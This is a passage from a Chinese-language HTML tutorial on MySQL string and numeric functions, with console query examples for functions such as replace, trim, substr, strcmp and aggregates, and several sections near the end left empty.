class="line">| What a goodbad day!                    |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">#pos 值不在范围内，范围字符串 s1</span><br><span class="line">mysql&gt; select insert(&quot;What a bad day!&quot;, 0, 3,&quot;good&quot;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| insert(&quot;What a bad day!&quot;, 0, 3,&quot;good&quot;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| What a bad day!                        |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">#pos+num 大于字符串 s1 长度，替换 pos 位置后的全部字符</span><br><span class="line">mysql&gt; select insert(&quot;What a bad day!&quot;, 8, 20,&quot;good&quot;);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| insert(&quot;What a bad day!&quot;, 8, 20,&quot;good&quot;) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| What a good                             |</span><br><span class="line">+-----------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**替换字符串 s 中的子字符串 olds 为 news。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select replace(&quot;What a bad day!&quot;, &quot;bad&quot;, &quot;good&quot;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| replace(&quot;What a bad day!&quot;, &quot;bad&quot;, &quot;good&quot;) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| What a good day!                          |</span><br><span class="line">+-------------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**使用字符串 pads 填充字符串 s ，至长度为 len。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#左填充</span><br><span class="line">mysql&gt; select lpad(&quot;12345&quot;, 10, &quot;0&quot;);</span><br><span class="line">+------------------------+</span><br><span class="line">| lpad(&quot;12345&quot;, 10, &quot;0&quot;) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 0000012345             |</span><br><span class="line">+------------------------+</span><br><span class="line">#右填充</span><br><span class="line">mysql&gt; select rpad(&quot;12345&quot;, 10, &quot;0&quot;);</span><br><span class="line">+------------------------+</span><br><span class="line">| rpad(&quot;12345&quot;, 10, &quot;0&quot;) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 1234500000             |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**去除字符串首尾的空格。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select trim(&quot;     Too many spaces           &quot;);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| trim(&quot;     Too many spaces           &quot;) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| Too many spaces                         |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">#首部去空格</span><br><span class="line">mysql&gt; select ltrim(&quot;     Too many spaces           &quot;);</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| ltrim(&quot;     Too many spaces           &quot;) |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| Too many spaces                          |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">#尾部去空格</span><br><span class="line">mysql&gt; select concat(rtrim(&quot;     Too many spaces          &quot;), &quot;!&quot;);</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| concat(rtrim(&quot;     Too many spaces          &quot;), &quot;!&quot;) |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">|      Too many spaces!                                |</span><br><span class="line">+------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**字符串英文小写。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select lcase(&quot;AllToLower&quot;);</span><br><span class="line">+---------------------+</span><br><span class="line">| lcase(&quot;AllToLower&quot;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| alltolower          |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**字符串英文大写。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ucase(&quot;AllToUpper&quot;);</span><br><span class="line">+---------------------+</span><br><span class="line">| ucase(&quot;AllToUpper&quot;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| ALLTOUPPER          |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**字符串逆序。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select reverse(&quot;12345&quot;);</span><br><span class="line">+------------------+</span><br><span class="line">| reverse(&quot;12345&quot;) |</span><br><span class="line">+------------------+</span><br><span class="line">| 54321            |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="1-5-子字符串提取">1.5 子字符串提取</h3>
+<blockquote>
+<ul>
+<li><code>mid(string, start, len)</code> | <code>substr(string, start, len)</code> | <code>sbustring(string, start, len)</code>, 任意提取子字符串</li>
+<li><code>left(string, num)</code> | <code>right(string, num)</code>，提取左/右子字符串</li>
+<li><code>sbustring_index(s, delimiter, num)</code>，提取第 num 个分隔符 delimiter 前的子字符串</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;mid(string, start, len)&#96;|&#96;substr(string, start, len)&#96;|&#96;sbustring(string, start, len)</span><br></pre></td></tr></table></figure>
+<p>**描述：**在 string start 位置提取长度为 len 的子字符串。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(&quot;123456789&quot;, 3, 3);</span><br><span class="line">+---------------------------+</span><br><span class="line">| substr(&quot;123456789&quot;, 3, 3) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 345                       |</span><br><span class="line">+---------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(&quot;123456789&quot;, 3, 3);</span><br><span class="line">+------------------------+</span><br><span class="line">| mid(&quot;123456789&quot;, 3, 3) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 345                    |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**从字符串首部/尾部，提取长度为 num 的子字符串。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#首部提取</span><br><span class="line">mysql&gt; select left(&quot;123456789&quot;, 3);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(&quot;123456789&quot;, 3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 123                  |</span><br><span class="line">+----------------------+</span><br><span class="line">#尾部提取</span><br><span class="line">mysql&gt; select right(&quot;123456789&quot;, 3);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(&quot;123456789&quot;, 3) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 789                   |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**提取第 num 个分隔符 delimiter 前的子字符串，num 值为正数则从右到左数起，为负数则从左到右数起。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substring_index(&quot;www.youtellme.org&quot;, &quot;.&quot;, 1);</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| substring_index(&quot;www.youtellme.org&quot;, &quot;.&quot;, 1) |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| www                                          |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring_index(&quot;www.youtellme.org&quot;, &quot;.&quot;, -1);</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| substring_index(&quot;www.youtellme.org&quot;, &quot;.&quot;, -1) |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| org                                           |</span><br><span class="line">+-----------------------------------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="1-6-字符串比较">1.6 字符串比较</h3>
+<blockquote>
+<p><code>strcmp(s1, s2)</code>，比较字符串的大小</p>
+</blockquote>
+<p><strong>描述：</strong></p>
+<ul>
+<li>s1 = s2，返回 0</li>
+<li>s1 &lt; s2，返回 -1</li>
+<li>s1 &gt; s2，返回 1</li>
+</ul>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select strcmp(&quot;abc&quot;, &quot;Abc&quot;);</span><br><span class="line">+----------------------+</span><br><span class="line">| strcmp(&quot;abc&quot;, &quot;Abc&quot;) |  #不区分大小写</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br><span class="line"></span><br><span class="line">#按次序比较</span><br><span class="line">mysql&gt; select strcmp(&quot;abcd&quot;, &quot;abdc&quot;);</span><br><span class="line">+------------------------+</span><br><span class="line">| strcmp(&quot;abcd&quot;, &quot;abdc&quot;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                     -1 |</span><br><span class="line">+------------------------+</span><br><span class="line">#按次序比较</span><br><span class="line">mysql&gt; select strcmp(&quot;b&quot;, &quot;abdc&quot;);</span><br><span class="line">+---------------------+</span><br><span class="line">| strcmp(&quot;b&quot;, &quot;abdc&quot;) |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   1 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="1-7-其它操作">1.7 其它操作</h3>
+<blockquote>
+<ul>
+<li><code>ascii(s)</code>，返回字符串 s 第一个字符的 ASCII</li>
+<li><code>repeat(string, num)</code>，生成重复字符串</li>
+<li><code>space(num)</code>，生成全空格字符串</li>
+<li><code>format(num, n)</code>, 将数 num 格式化为 “xxx,xxx. xx”形式</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(s)</span><br></pre></td></tr></table></figure>
+<p>**描述：**返回字符串 s 的第一个字符的 ASCII 码。</p>
+<p>**实例：**返回 comments 表中 comment 列的的第一个字符的 ASCII 码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select comment,ascii(comment)as ASCIIOfFirstChar from comments;</span><br><span class="line">+---------------------------+------------------+</span><br><span class="line">| comment                   | ASCIIOfFirstChar |</span><br><span class="line">+---------------------------+------------------+</span><br><span class="line">| test                      |              116 |</span><br><span class="line">| hhhh                      |              104 |</span><br><span class="line">| Need lots of improvements |               78 |</span><br><span class="line">+---------------------------+------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**生成重复字符串 string num 次的字符串。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select repeat(&quot;Ha&quot;, 3);</span><br><span class="line">+-----------------+</span><br><span class="line">| repeat(&quot;Ha&quot;, 3) |</span><br><span class="line">+-----------------+</span><br><span class="line">| HaHaHa          |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**生成 num 个空格的字符串。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#39;some&#39;,space(4),&#39;space&#39;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| concat(&#39;some&#39;,space(4),&#39;space&#39;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| some    space                   |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure>
+<p><code>format(num, n)</code>,</p>
+<p>**描述：**将数 num 格式化为 “xxx,xxx. xx”形式</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select format(201910.0100, 2);</span><br><span class="line">+------------------------+</span><br><span class="line">| format(201910.0100, 2) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 201,910.01             |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
+<h2 id="2-数值函数">2 数值函数</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">ABS(x)</td>
+<td style="text-align:left">返回x的绝对值</td>
+</tr>
+<tr>
+<td style="text-align:left">ACOS(x)</td>
+<td style="text-align:left">求x的反余弦值（参数是弧度）</td>
+</tr>
+<tr>
+<td style="text-align:left">ASIN(x)</td>
+<td style="text-align:left">求反正弦值（参数是弧度）</td>
+</tr>
+<tr>
+<td style="text-align:left">ATAN(x)</td>
+<td style="text-align:left">求反正切值（参数是弧度）</td>
+</tr>
+<tr>
+<td style="text-align:left">ATAN2(n, m)</td>
+<td style="text-align:left">求反正切值(参数是弧度)</td>
+</tr>
+<tr>
+<td style="text-align:left">AVG(expression)</td>
+<td style="text-align:left">返回一个表达式的平均值，expression 是一个字段</td>
+</tr>
+<tr>
+<td style="text-align:left">CEIL(x) CEILING(x)</td>
+<td style="text-align:left">返回大于或等于 x 的最小整数</td>
+</tr>
+<tr>
+<td style="text-align:left">COS(x)</td>
+<td style="text-align:left">求余弦值(参数是弧度)</td>
+</tr>
+<tr>
+<td style="text-align:left">COT(x)</td>
+<td style="text-align:left">求余切值(参数是弧度)</td>
+</tr>
+<tr>
+<td style="text-align:left">COUNT(expression)</td>
+<td style="text-align:left">返回查询的记录总数，expression 参数是一个字段或者 * 号</td>
+</tr>
+<tr>
+<td style="text-align:left">DEGREES(x)</td>
+<td style="text-align:left">将弧度转换为角度</td>
+</tr>
+<tr>
+<td style="text-align:left">n DIV m</td>
+<td style="text-align:left">整除，n 为被除数，m 为除数</td>
+</tr>
+<tr>
+<td style="text-align:left">EXP(x)</td>
+<td style="text-align:left">返回 e 的 x 次方</td>
+</tr>
+<tr>
+<td style="text-align:left">FLOOR(x)</td>
+<td style="text-align:left">返回小于或等于 x 的最大整数</td>
+</tr>
+<tr>
+<td style="text-align:left">GREATEST(expr1, expr2, expr3, …)</td>
+<td style="text-align:left">返回列表中的最大值</td>
+</tr>
+<tr>
+<td style="text-align:left">LEAST(expr1, expr2, expr3, …)</td>
+<td style="text-align:left">返回列表中的最小值</td>
+</tr>
+<tr>
+<td style="text-align:left"><a href="https://www.runoob.com/mysql/func_mysql_ln.asp" target="_blank" rel="noopener">LN</a></td>
+<td style="text-align:left">返回数字的自然对数</td>
+</tr>
+<tr>
+<td style="text-align:left">LOG(x)</td>
+<td style="text-align:left">返回自然对数(以 e 为底的对数)</td>
+</tr>
+<tr>
+<td style="text-align:left">LOG10(x)</td>
+<td style="text-align:left">返回以 10 为底的对数</td>
+</tr>
+<tr>
+<td style="text-align:left">LOG2(x)</td>
+<td style="text-align:left">返回以 2 为底的对数</td>
+</tr>
+<tr>
+<td style="text-align:left">MAX(expression)</td>
+<td style="text-align:left">返回字段 expression 中的最大值</td>
+</tr>
+<tr>
+<td style="text-align:left">MIN(expression)</td>
+<td style="text-align:left">返回字段 expression 中的最小值</td>
+</tr>
+<tr>
+<td style="text-align:left">MOD(x,y)</td>
+<td style="text-align:left">返回 x 除以 y 以后的余数</td>
+</tr>
+<tr>
+<td style="text-align:left">PI()</td>
+<td style="text-align:left">返回圆周率(3.141593）</td>
+</tr>
+<tr>
+<td style="text-align:left">POW(x,y)</td>
+<td style="text-align:left">返回 x 的 y 次方</td>
+</tr>
+<tr>
+<td style="text-align:left">POWER(x,y)</td>
+<td style="text-align:left">返回 x 的 y 次方</td>
+</tr>
+<tr>
+<td style="text-align:left">RADIANS(x)</td>
+<td style="text-align:left">将角度转换为弧度</td>
+</tr>
+<tr>
+<td style="text-align:left">RAND()</td>
+<td style="text-align:left">返回 0 到 1 的随机数</td>
+</tr>
+<tr>
+<td style="text-align:left">ROUND(x)</td>
+<td style="text-align:left">返回离 x 最近的整数</td>
+</tr>
+<tr>
+<td style="text-align:left">SIGN(x)</td>
+<td style="text-align:left">返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1</td>
+</tr>
+<tr>
+<td style="text-align:left">SIN(x)</td>
+<td style="text-align:left">求正弦值(参数是弧度)</td>
+</tr>
+<tr>
+<td style="text-align:left">SQRT(x)</td>
+<td style="text-align:left">返回x的平方根</td>
+</tr>
+<tr>
+<td style="text-align:left">SUM(expression)</td>
+<td style="text-align:left">返回指定字段的总和</td>
+</tr>
+<tr>
+<td style="text-align:left">TAN(x)</td>
+<td style="text-align:left">求正切值(参数是弧度)</td>
+</tr>
+<tr>
+<td style="text-align:left">TRUNCATE(x,y)</td>
+<td style="text-align:left">返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-1-统计函数">2.1 统计函数</h3>
+<blockquote>
+<ul>
+<li><code>greatest(v1, v2...)</code> | <code>least(v1, v2...)</code>，最大/最小值</li>
+<li><code>max(exp)</code> | <code>min(exp)</code>，列中的最大/最小值</li>
+<li><code>sum(exp)</code> ，求列和</li>
+<li><code>avg(exp)</code>，求列均值</li>
+<li><code>count(exp)</code>，统计查询返回的行数</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">greatest(v1, v2...)&#96; | &#96;least(v1, v2...)</span><br></pre></td></tr></table></figure>
+<p>**描述：**返回一系列数的最大/最小值</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select greatest(1, 3, 5, 7, 0);</span><br><span class="line">+-------------------------+</span><br><span class="line">| greatest(1, 3, 5, 7, 0) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       7 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select least(1, 3, 5, 7, 0);</span><br><span class="line">+----------------------+</span><br><span class="line">| least(1, 3, 5, 7, 0) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**返回表达式 exp 计算后的最大/最小值</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#列值</span><br><span class="line">mysql&gt; select max(id) from comments;</span><br><span class="line">+---------+</span><br><span class="line">| max(id) |</span><br><span class="line">+---------+</span><br><span class="line">|       3 |</span><br><span class="line">+---------+</span><br><span class="line">mysql&gt; select min(id) from comments;</span><br><span class="line">+---------+</span><br><span class="line">| min(id) |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">#表达式</span><br><span class="line">mysql&gt; select max(pow(id, 3) + 2) from comments;</span><br><span class="line">+---------------------+</span><br><span class="line">| max(pow(id, 3) + 2) |</span><br><span class="line">+---------------------+</span><br><span class="line">|                  29 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**返回表达式计算后系列数的和</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#列值求和</span><br><span class="line">mysql&gt; select sum(id) from comments;</span><br><span class="line">+---------+</span><br><span class="line">| sum(id) |</span><br><span class="line">+---------+</span><br><span class="line">|       6 |</span><br><span class="line">+---------+</span><br><span class="line">#表达式计算后求和</span><br><span class="line">mysql&gt; select sum(pow(id, 2)) from comments;</span><br><span class="line">+-----------------+</span><br><span class="line">| sum(pow(id, 2)) |</span><br><span class="line">+-----------------+</span><br><span class="line">|              14 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**返回表达式计算后系列数的均值</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#列值</span><br><span class="line">mysql&gt; select avg(id) from comments;</span><br><span class="line">+---------+</span><br><span class="line">| avg(id) |</span><br><span class="line">+---------+</span><br><span class="line">|  2.0000 |</span><br><span class="line">+---------+</span><br><span class="line">#表达式</span><br><span class="line">mysql&gt; select avg(pow(id, 2)) from comments;</span><br><span class="line">+-------------------+</span><br><span class="line">| avg(pow(id, 2))   |</span><br><span class="line">+-------------------+</span><br><span class="line">| 4.666666666666667 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**返回查询的行数</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#统计 id 数</span><br><span class="line">mysql&gt; select count(id) from comments;</span><br><span class="line">+-----------+</span><br><span class="line">| count(id) |</span><br><span class="line">+-----------+</span><br><span class="line">|         3 |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+<h3 id="2-2-取整函数">2.2 取整函数</h3>
+<blockquote>
+<ul>
+<li><code>abs(num)</code>，求绝对值，|num||num|</li>
+<li><code>ceil(num)</code> | <code>ceiling(num)</code>，取上整数，⌈num⌉⌈num⌉</li>
+<li><code>floor(num)</code> ，取下整数，⌊num⌋⌊num⌋</li>
+<li><code>round(num, [decimals])</code>，取约数，四舍五入</li>
+<li><code>truncate(num, decimals)</code>，截断小数部分</li>
+<li><code>div(x, y)</code>，x 除以 y，返回一个整数</li>
+<li><code>mod(x, y)</code> | <code>x mod y</code> | <code>x % y</code>，x 模 y</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(num)</span><br></pre></td></tr></table></figure>
+<p><strong>描述：</strong></p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">ceil(num)&#96; | &#96;ceiling(num)</span><br></pre></td></tr></table></figure>
+<p>**描述：**取上整数</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">floor(num)</span><br></pre></td></tr></table></figure>
+<p><strong>描述：</strong></p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">round(num, [decimals])</span><br></pre></td></tr></table></figure>
+<p><strong>描述：</strong></p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">truncate(num, decimals)</span><br></pre></td></tr></table></figure>
+<p><strong>描述：</strong></p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">div(x, y)</span><br></pre></td></tr></table></figure>
+<p><strong>描述：</strong></p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">mod(x, y)&#96; | &#96;x mod y&#96; | &#96;x % y</span><br></pre></td></tr></table></figure>
+<p><strong>描述：</strong></p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>
+<h3 id="2-3-幂函数">2.3 幂函数</h3>
+<blockquote>
+<ul>
+<li><code>pow(x, y)</code> | <code>power(x, y)</code>，xyxy</li>
+<li><code>sqrt(num)</code>，num−−−−√num，负数返回 NULL</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
